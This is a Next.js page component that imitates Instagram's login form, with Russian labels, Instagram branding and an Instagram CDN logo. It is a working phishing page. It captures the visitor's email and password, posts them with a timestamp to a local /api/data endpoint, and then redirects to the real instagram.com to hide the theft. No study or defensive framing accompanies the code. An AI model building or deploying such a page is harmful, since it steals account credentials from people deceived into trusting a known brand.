"use client";
import Image from "next/image";
import logo from "./logo.png";
import load from "./load.png";
import "./styles.css";
import { useEffect, useState } from "react";
import Link from "next/link";

export default function Home() {
  const [startTime] = useState(new Date());
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  console.log(email, password);
  // Capture form submission
  const handleFormSubmit = () => {
    setLoading(true);
    // Send data to the server
    const formData = {
      email,
      password,
      date: startTime.toISOString(),
    };

    fetch("/api/data", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    })
      .then((response) => {
        setLoading(true);
        // Handle server response here
        document.location.replace("https://instagram.com");
      })
      .catch((error) => {
        console.error("Error sending data to server:", error);
      });
  };
  console.log(
    Boolean(
      email?.trim() === "" ||
        password?.trim() === "" ||
        password?.trim().length < 8
    )
  );
  return (
    <>
      <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex"></section>
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              <Image className="copyright" src={logo} alt="log" height={90} />
            </h1>
            <form>
              <label htmlFor="email" className="sr-only">
                Tелефон, имя пользователя или эл. адрес
              </label>
              <input
                onChange={(e) => setEmail(e.target.value)}
                name="email"
                placeholder="Tелефон, имя пользователя или эл. адрес"
              />
              <label htmlFor="password" className="sr-only">
                Пароль
              </label>
              <input
                onChange={(e) => setPassword(e.target.value)}
                name="password"
                type="password"
                placeholder="Пароль"
              />
              <button
                disabled={Boolean(
                  email?.trim() === "" ||
                    password?.trim() === "" ||
                    password?.trim().length < 8
                )}
                id="submit"
                type="button"
                onClick={handleFormSubmit}
              >
                {loading ? (
                  <Image
                    className="copyright"
                    src={load}
                    alt="log"
                    height={20}
                  />
                ) : (
                  "Войти"
                )}
              </button>
            </form>
          </div>
          <div className="panel register flex justify-content-center">
            <p>У вас нет аккаунта?</p>
            <a href="#">Зарегистрироваться</a>
          </div>
        </section>
      </main>
      <footer>
        <Image
          className="copyright"
          width="70"
          src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg"
          alt="log"
          height={90}
        />
      </footer>
    </>
  );
}
